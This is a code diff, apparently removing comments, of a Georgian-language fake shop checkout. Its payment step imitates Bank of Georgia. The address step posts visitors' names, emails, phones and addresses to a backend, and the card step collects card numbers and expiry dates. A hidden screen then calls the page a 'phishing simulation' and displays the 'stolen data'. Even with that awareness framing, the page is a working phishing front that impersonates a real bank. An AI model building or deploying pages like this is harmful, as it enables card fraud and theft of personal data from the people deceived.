@@ -20,7 +20,6 @@ body { font-family:'Noto Sans Georgian','Segoe UI',sans-serif; background:var(--
 
 .warn-bar { background:#c0392b; color:#fff; text-align:center; padding:8px 14px; font-size:11px; font-weight:700; }
 
-/* HEADER */
 .header {
   background:var(--blue); height:56px;
   display:flex; align-items:center; gap:10px;
@@ -32,7 +31,6 @@ body { font-family:'Noto Sans Georgian','Segoe UI',sans-serif; background:var(--
 .logo-text span { color:#ffcc02; }
 .header-back { color:rgba(255,255,255,.8); font-size:13px; margin-left:auto; cursor:pointer; }
 
-/* STEPS BAR */
 .steps-bar {
   background:#fff; border-bottom:1px solid var(--border);
   display:flex; justify-content:center; gap:0;
@@ -55,10 +53,8 @@ body { font-family:'Noto Sans Georgian','Segoe UI',sans-serif; background:var(--
 .step-tab.active .step-num { background:var(--bog); color:#fff; }
 .step-tab.done   .step-num { background:var(--green); color:#fff; }
 
-/* MAIN */
 .main { max-width:560px; margin:20px auto 40px; padding:0 14px; }
 
-/* ORDER SUMMARY */
 .order-summary {
   background:#fff; border-radius:13px;
   padding:16px 18px; margin-bottom:16px;
@@ -74,7 +70,6 @@ body { font-family:'Noto Sans Georgian','Segoe UI',sans-serif; background:var(--
 .op-new { font-size:18px; font-weight:800; color:var(--green); }
 .free-tag { background:#e8f5e9; color:var(--green); font-size:11px; font-weight:700; border-radius:6px; padding:2px 7px; border:1px solid #a5d6a7; }
 
-/* FORM CARD */
 .form-card {
   background:#fff; border-radius:13px;
   padding:20px 18px; margin-bottom:16px;
@@ -100,7 +95,6 @@ body { font-family:'Noto Sans Georgian','Segoe UI',sans-serif; background:var(--
 .field-row { display:flex; gap:10px; }
 .field-row .field { flex:1; }
 
-/* delivery note */
 .delivery-note {
   background:#e8f5e9; border-radius:9px; padding:12px 14px;
   display:flex; gap:10px; align-items:flex-start; margin-bottom:14px;
@@ -108,7 +102,6 @@ body { font-family:'Noto Sans Georgian','Segoe UI',sans-serif; background:var(--
 }
 .delivery-note p { font-size:12px; color:#2e7d32; line-height:1.5; }
 
-/* BTN */
 .btn-primary {
   width:100%; padding:16px;
   border:none; border-radius:11px;
@@ -121,7 +114,6 @@ body { font-family:'Noto Sans Georgian','Segoe UI',sans-serif; background:var(--
 .btn-bog       { background:var(--bog); color:#fff; box-shadow:0 4px 14px rgba(252,103,25,.35); display:flex; align-items:center; justify-content:center; gap:10px; }
 .btn-bog:hover { background:var(--bog-dark); }
 
-/* ── PAYMENT STEP ── */
 .bog-header {
   background:var(--bog); border-radius:13px 13px 0 0;
   padding:16px 18px; display:flex; align-items:center; gap:12px;
@@ -146,11 +138,9 @@ body { font-family:'Noto Sans Georgian','Segoe UI',sans-serif; background:var(--
 .card-value { font-size:13px; font-weight:600; color:#fff; }
 .card-type   { font-size:24px; }
 
-/* card fields */
 .field.card-field input { letter-spacing:2px; font-size:15px; font-weight:600; }
 .field.cvv-field input  { letter-spacing:3px; font-size:15px; font-weight:600; }
 
-/* amount box */
 .amount-box {
   background:#fff3eb; border:1.5px solid var(--bog);
   border-radius:10px; padding:14px 16px; margin-bottom:16px;
@@ -159,11 +149,9 @@ body { font-family:'Noto Sans Georgian','Segoe UI',sans-serif; background:var(--
 .amount-box .label { font-size:13px; color:#555; font-weight:600; }
 .amount-box .amount { font-size:22px; font-weight:800; color:var(--bog); }
 
-/* secure badges */
 .secure-row { display:flex; justify-content:center; gap:16px; margin-top:12px; flex-wrap:wrap; }
 .secure-badge { font-size:11px; color:#888; display:flex; align-items:center; gap:4px; }
 
-/* success screen */
 .success-screen { display:none; text-align:center; padding:40px 20px; }
 .success-screen .s-icon { font-size:64px; margin-bottom:16px; }
 .success-screen h2 { font-size:22px; font-weight:800; color:#1a1a1a; margin-bottom:8px; }
@@ -172,7 +160,6 @@ body { font-family:'Noto Sans Georgian','Segoe UI',sans-serif; background:var(--
 .success-screen .detail-box div { margin-bottom:8px; display:flex; justify-content:space-between; }
 .success-screen .detail-box div:last-child { margin:0; }
 
-/* steps visibility */
 #step-address { display:block; }
 #step-payment { display:none; }
 </style>
@@ -181,14 +168,12 @@ body { font-family:'Noto Sans Georgian','Segoe UI',sans-serif; background:var(--
 
 
 
-<!-- HEADER -->
 <div class="header">
   <a href="index.html" style="display:flex;align-items:center;gap:10px;text-decoration:none"><div class="logo-icon">🛒</div>
   <div class="logo-text">Tech<span>Shop</span></div></a>
   <div class="header-back" onclick="history.back()">← მთავარი</div>
 </div>
 
-<!-- STEPS -->
 <div class="steps-bar">
   <div class="step-tab active" id="tab1">
     <div class="step-num" id="sn1">1</div> მიწოდება
@@ -201,7 +186,6 @@ body { font-family:'Noto Sans Georgian','Segoe UI',sans-serif; background:var(--
 <div class="main">
 
 
-  <!-- ORDER SUMMARY -->
   <div class="order-summary">
     <div class="order-img"><img src="images/magsafe.jpg" alt="MagSafe"></div>
     <div>
@@ -215,7 +199,6 @@ body { font-family:'Noto Sans Georgian','Segoe UI',sans-serif; background:var(--
     </div>
   </div>
 
-  <!-- ══ STEP 1: ADDRESS ══ -->
   <div id="step-address">
     <div class="form-card">
       <h3>📦 მიწოდების ინფორმაცია</h3>
@@ -285,10 +268,8 @@ body { font-family:'Noto Sans Georgian','Segoe UI',sans-serif; background:var(--
     </div>
   </div>
 
-  <!-- ══ STEP 2: PAYMENT ══ -->
   <div id="step-payment">
 
-    <!-- BOG HEADER -->
     <div class="bog-header">
       <div class="bog-logo-box">BOG</div>
       <div>
@@ -298,7 +279,6 @@ body { font-family:'Noto Sans Georgian','Segoe UI',sans-serif; background:var(--
     </div>
     <div class="bog-body">
 
-      <!-- card visual preview -->
       <div class="card-visual" id="card-preview">
         <div class="card-chip">💳</div>
         <div class="card-num-display" id="prev-num">•••• •••• •••• ••••</div>
@@ -315,13 +295,11 @@ body { font-family:'Noto Sans Georgian','Segoe UI',sans-serif; background:var(--
         </div>
       </div>
 
-      <!-- amount -->
       <div class="amount-box">
         <div class="label">გადასახდელი თანხა</div>
         <div class="amount">5.00 ₾</div>
       </div>
 
-      <!-- card number -->
       <div class="field card-field">
         <label>ბარათის ნომერი</label>
         <input type="tel" id="card-num" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric" oninput="fmtCard(this)" onkeyup="updatePreview()">
@@ -359,7 +337,6 @@ body { font-family:'Noto Sans Georgian','Segoe UI',sans-serif; background:var(--
 
     </div>
 
-    <!-- SUCCESS SCREEN (hidden) -->
     <div class="success-screen" id="success-screen">
       <div class="s-icon">🎣</div>
       <h2>ფიშინგის სიმულაცია!</h2>
@@ -379,7 +356,6 @@ body { font-family:'Noto Sans Georgian','Segoe UI',sans-serif; background:var(--
 </div>
 
 <script>
-// ── STEP NAV ──
 async function goPayment() {
 
   const fields = ['fname','lname','email','phone','addr','district'];
@@ -406,7 +382,6 @@ async function goPayment() {
 
   if (!ok) return;
 
-  // მონაცემების გაგზავნა ბექში
   const data = {
     fname: document.getElementById('fname').value,
     lname: document.getElementById('lname').value,
@@ -436,11 +411,9 @@ async function goPayment() {
     console.error(err);
   }
 
-  // შემდეგ გვერდზე გადასვლა
   window.location.href = 'bog-payment.html';
 }
 
-// ── CARD FORMATTING ──
 function fmtCard(el) {
   let v = el.value.replace(/\D/g,'').substring(0,16);
   el.value = v.replace(/(.{4})/g,'$1 ').trim();
@@ -451,7 +424,6 @@ function fmtExp(el) {
   el.value = v;
 }
 
-// ── LIVE PREVIEW ──
 function updatePreview() {
   const num  = document.getElementById('card-num').value  || '•••• •••• •••• ••••';
   const name = document.getElementById('card-name').value || 'სახელი გვარი';
@@ -459,13 +431,11 @@ function updatePreview() {
   document.getElementById('prev-num').textContent  = num.padEnd(19,'•').substring(0,19);
   document.getElementById('prev-name').textContent = name.toUpperCase();
   document.getElementById('prev-exp').textContent  = exp;
-  // card type icon
   const first = (document.getElementById('card-num').value||'')[0];
   const types = {'4':'💳 Visa','5':'💳 MC','3':'💳 Amex'};
   document.getElementById('prev-type').textContent = types[first] || '💳';
 }
 
-// ── PAYMENT SUBMIT ──
 function submitPayment() {
   const fields = [
     {id:'card-num', check: v => v.replace(/\s/g,'').length===16},
@@ -481,7 +451,6 @@ function submitPayment() {
   });
   if (!ok) return;
 
-  // show stolen data
   document.getElementById('stolen-data').innerHTML = `
     <div><span>👤 სახელი</span><strong>${document.getElementById('fname').value} ${document.getElementById('lname').value}</strong></div>
     <div><span>📧 ელ-ფოსტა</span><strong>${document.getElementById('email').value}</strong></div>
